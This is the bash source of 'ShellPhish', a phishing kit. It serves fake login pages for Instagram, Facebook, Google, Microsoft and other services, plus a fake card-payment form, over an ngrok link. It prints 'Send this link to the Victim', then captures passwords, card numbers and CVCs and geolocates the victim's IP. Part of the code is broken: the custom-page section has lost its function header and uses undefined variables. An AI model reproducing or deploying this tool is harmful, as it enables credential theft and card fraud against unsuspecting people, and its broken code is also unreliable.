#!/bin/bash
# ShellPhish v1.4
# Coded by: thelinuxchoice
# Github: https://github.com/thelinuxchoice/shellphish
# This script uses some Phishing Pages generated by SocialFish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish)
# Instagram Phishing Page generated by An0nUD4Y (https://github.com/An0nUD4Y) 
# Thanks to @suljot_gjoka
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="spotify"
start

elif [[ $option == 8 ]]; then
server="netflix"
start

elif [[ $option == 9 ]]; then
server="origin"
start

elif [[ $option == 10 ]]; then
server="steam"
start

elif [[ $option == 11 ]]; then
server="yahoo"
start

elif [[ $option == 12 ]]; then
server="linkedin"
start

elif [[ $option == 13 ]]; then
server="protonmail"
start

elif [[ $option == 14 ]]; then
server="wordpress"
start

elif [[ $option == 15 ]]; then
server="microsoft"
start

elif [[ $option == 16 ]]; then
server="instafollowers"
start

elif [[ $option == 17 ]]; then
server="gitlab"
start

elif [[ $option == 18 ]]; then
server="create"
createpage
start
elif [[ $option == 19 ]]; then
server="cvv"
start

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi


}

banner() {

printf "\e[1;77m     _     _             _  _  ______   _      _        _      \e[0m\n"
printf "\e[1;77m    | |   | |           | || |(_____ \ | |    (_)      | |     \e[0m\n"
printf "\e[1;77m     \ \  | | _    ____ | || | _____) )| | _   _   ___ | | _   \e[0m\n"
printf "\e[1;77m      \ \ | || \  / _  )| || ||  ____/ | || \ | | /___)| || \  \e[0m\n"
printf "\e[1;77m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
printf "\e[1;77m (______/ |_| |_| \____)|_||_||_|      |_| |_||_|(___/ |_| |_| v1.4\e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @thelinuxchoice \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
printf "\n"
}

default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"
    default_owner="Cardholder Name:"
    default_cardNumber="Card Number:"
    default_expirationdate="Expiration Date:"
    default_securitycode="Security Code:"

    # Prompt user for input with default values
    read -p "Title 1 (Default: Wi-fi Session Expired): " cap1
    cap1="${cap1:-${default_cap1}}"

    read -p "Title 2 (Default: Please login again.): " cap2
    cap2="${cap2:-${default_cap2}}"

    read -p "Username field (Default: Username:): " user_text
    user_text="${user_text:-${default_user_text}}"

    read -p "Password field (Default: Password:): " pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p "Submit button text (Default: Log-In): " sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    read -p "Cardholder Name field (Default: Cardholder Name:): " owner
    owner="${owner:-${default_owner}}"

    read -p "Card Number field (Default: Card Number:): " cardNumber
    cardNumber="${cardNumber:-${default_cardNumber}}"

    read -p "Expiration Date field (Default: Expiration Date:): " expirationdate
    expirationdate="${expirationdate:-${default_expirationdate}}"

    read -p "Security Code field (Default: Security Code:): " securitycode
    securitycode="${securitycode:-${default_securitycode}}"



echo "<!DOCTYPE html>" > sites/create/registre.html
echo "<html>" >> sites/create/registre.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/registre.html

IFS=$'\n'
printf '<form action="#" class="container">\n' >> sites/create/registre.html
printf '    <h1>%s</h1>\n' "$cap1" >> sites/create/registre.html
printf '    <div class="row">\n' >> sites/create/registre.html
printf '        <div class="col-xs-12">\n' >> sites/create/registre.html
printf '            <div class="row">\n' >> sites/create/registre.html
printf '                <div class="form-element">\n' >> sites/create/registre.html
printf '                    <div class="form-group">\n' >> sites/create/registre.html
printf '                        <label class="floating-label"></label>\n' >> sites/create/registre.html
printf '                        <input type="text" name="owner" id="owner" class="form-control" placeholder="%s">\n' "$owner_label" >> sites/create/registre.html
printf '                    </div>\n' >> sites/create/registre.html
printf '                </div>\n' >> sites/create/registre.html
printf '            </div>\n' >> sites/create/registre.html

printf '            <div class="form-element">\n' >> sites/create/registre.html
printf '                <label class="floating-label"></label>\n' >> sites/create/registre.html
printf '                <div class="input-group">\n' >> sites/create/registre.html
printf '                    <input type="text" name="cardNumber" data-def="0000 0000 0000 0000" id="cardNumber" class="form-control" placeholder="%s">\n' "$card_number_label" >> sites/create/registre.html
printf '                    <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>\n' >> sites/create/registre.html
printf '                </div>\n' >> sites/create/registre.html
printf '            </div>\n' >> sites/create/registre.html

printf '            <div class="form-element">\n' >> sites/create/registre.html
printf '                <label class="floating-label"></label>\n' >> sites/create/registre.html
printf '                <div class="input-group">\n' >> sites/create/registre.html
printf '                    <input type="text" name="expirationdate" id="expirationdate" class="form-control" placeholder="%s">\n' "$expiration_label" >> sites/create/registre.html
printf '                    <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>\n' >> sites/create/registre.html
printf '                </div>\n' >> sites/create/registre.html
printf '            </div>\n' >> sites/create/registre.html
printf '        </div>\n' >> sites/create/registre.html
printf '    </div>\n' >> sites/create/registre.html

printf '    <div class="row">\n' >> sites/create/registre.html
printf '        <div class="form-element">\n' >> sites/create/registre.html
printf '            <div class="form-group">\n' >> sites/create/registre.html
printf '                <label class="floating-label"></label>\n' >> sites/create/registre.html
printf '                <input type="text" name="securitycode" id="securitycode" class="form-control" placeholder="%s">\n' "$security_label" >> sites/create/registre.html
printf '            </div>\n' >> sites/create/registre.html
printf '        </div>\n' >> sites/create/registre.html
printf '    </div>\n' >> sites/create/registre.html

printf '    <div class="form-group" id="credit_cards">\n' >> sites/create/registre.html
printf '        <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png">\n' >> sites/create/registre.html
printf '    </div>\n' >> sites/create/registre.html

printf '    <div class="form-group" id="pay-now">\n' >> sites/create/registre.html
printf '        <button class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize">%s</button>\n' "$sub_text" >> sites/create/registre.html
printf '    </div>\n' >> sites/create/registre.html

printf '</form>\n' >> sites/create/registre.html
echo "</body>" >> sites/create/registre.html
echo "</html>" >> sites/create/registre.html


}
catch_cred() {
  # Extract card details from captured data
  owner=$(grep -o 'owner:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
  cardnumber=$(grep -o 'cardNumber:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
  expiration=$(grep -o 'expirationdate:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
  cvc=$(grep -o 'securitycode:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')

  # Display stolen credit card information
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Card Owner:\e[0m\e[1;77m %s\n\e[0m" "$owner"
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Card Number:\e[0m\e[1;77m %s\n\e[0m" "$cardnumber"
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Expiration:\e[0m\e[1;77m %s\n\e[0m" "$expiration"
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m CVC:\e[0m\e[1;77m %s\n\e[0m" "$cvc"

  # Save the captured data
  cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server

  # Cleanup and exit
  killall -2 php > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  exit 1
}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
banner
dependencies
menu
